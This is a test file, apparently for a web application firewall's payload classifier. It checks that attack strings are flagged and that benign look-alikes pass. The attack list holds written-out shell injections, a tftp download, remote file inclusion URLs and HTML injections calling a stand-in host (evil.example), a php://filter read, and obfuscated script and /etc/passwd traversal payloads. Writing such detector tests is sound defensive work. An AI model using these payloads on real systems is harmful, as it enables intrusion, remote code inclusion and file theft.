import { describe, expect, it } from 'vitest';
import { classifyPayload } from '../../server/services/payloadClassifier.service.js';

/**
 * Rules added to close the gaps measured on the second source's development lines: shell
 * expansion syntax, Windows command lines, PHP complex-syntax injection, remote file
 * inclusion, HTML injection without <script>, and Unicode / named-entity canonicalisation.
 *
 * The attacks below are written against each technique with values of our own; none is
 * copied from an evaluation set. The benign half is what real applications send that looks
 * closest to each rule — the false positives a rule like this would be expected to make.
 */

const score = (p: string) => classifyPayload(p).score;

describe('second-source gaps — attacks', () => {
  const attacks: Array<[string, string]> = [
    ['shell arithmetic expansion', 'q=x;echo $((7+5))'],
    ['shell command substitution', 'name=a|$(echo hi)'],
    ['$IFS as separator', 'cmd=x&&cat$IFS/etc/hostname'],
    ['length expansion + test bracket', 'v=1; s=$(echo ab); [ 2 -eq ${#s} ] && sleep 4;'],
    ['sleep after a separator', 'host=a.example; sleep 3 #'],
    ['backtick echo', 'x=`echo abc`'],
    ['cmd /c', 'run=/c dir c:\\'],
    ['tftp download', 'p=x& tftp -i 10.0.0.9 get tool.exe'],
    ['Windows ping probe', 'h=a & ping -n 3 10.0.0.1 & rem'],
    ['PHP ${} injection', 'sort={${phpinfo()}}'],
    ['RFI via include parameter', '/index.php?inc_dir=http://evil.example/shell.txt'],
    ['RFI with ?? terminator', '/view.php?page=http://evil.example/x.txt??'],
    ['RFI with NUL terminator', '/view.php?f=http://evil.example/x.txt%00'],
    ['PHP stream wrapper', 'page=php://filter/convert.base64-encode/resource=index'],
    ['meta refresh injection', 'q=<meta http-equiv="refresh" content="0;url=http://evil.example">'],
    ['iframe injection', 'q=<iframe src=//evil.example></iframe>'],
    ['link injection', 'q=<link rel=stylesheet href=http://evil.example/x.css>'],
    ['style injection', 'q=<style>body{background:url(//evil.example/x)}</style>'],
    ['javascript: split by named entities', 'u=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&colon;alert(1)'],
    ['vbscript: URI', 'u=vbscript:msgbox(1)'],
    ['long-s script tag (NFKC)', 'q=<ſcript>alert(1)</ſcript>'],
    ['full-width traversal (NFKC)', 'file=．．／．．／etc／passwd']
  ];
  for (const [name, payload] of attacks) {
    it(`flags: ${name}`, () => expect(score(payload), JSON.stringify(classifyPayload(payload).signatures)).toBeGreaterThanOrEqual(25));
  }
});

describe('second-source gaps — legitimate look-alikes stay below 25', () => {
  const benign: string[] = [
    // URLs that legitimately travel in parameters
    '/viewer.html?file=https://cdn.example.com/docs/report.pdf',
    '/docs/?configUrl=https://api.example.com/swagger-config.json',
    '/app?baseUrl=https://api.example.com/v2',
    '/login?next=https://example.com/?',
    '/oauth/authorize?redirect_uri=https://app.example.com/callback',
    '/embed?template_src=https://assets.example.com/t.html',
    '/share?url=https://example.com/a?b=1',
    // code and prose that mentions shell or PHP
    '{"snippet":"$(document).ready(function(){ init(); })"}',
    'I work late; sleep 8 hours tonight',
    'sleep 5 minutes then retry',
    'ping me later about the report',
    'The phpinfo page is disabled in production',
    'price is $5 (IFS discount applies)',
    '/c/users/docs/readme.txt',
    // parameters that happen to share a name with a command word
    '/list?a=1&rem=5',
    '/search?q=remote+desktop&rem=true',
    // ordinary HTML a rich-text field might carry
    '<meta name="viewport" content="width=device-width">',
    '<a href="/about">About us</a>',
    '<b>bold</b> and <i>italic</i>',
    '/search?q=javascript+tutorial',
    // Arabic text with full-width and compatibility characters (NFKC must not invent attacks)
    'مرحبا بكم في المتجر ﷺ ١٢٣',
    'ＡＢＣ　ｆｕｌｌ　ｗｉｄｔｈ'
  ];
  for (const p of benign) {
    it(`passes: ${p}`, () => {
      const r = classifyPayload(p);
      expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
    });
  }
});
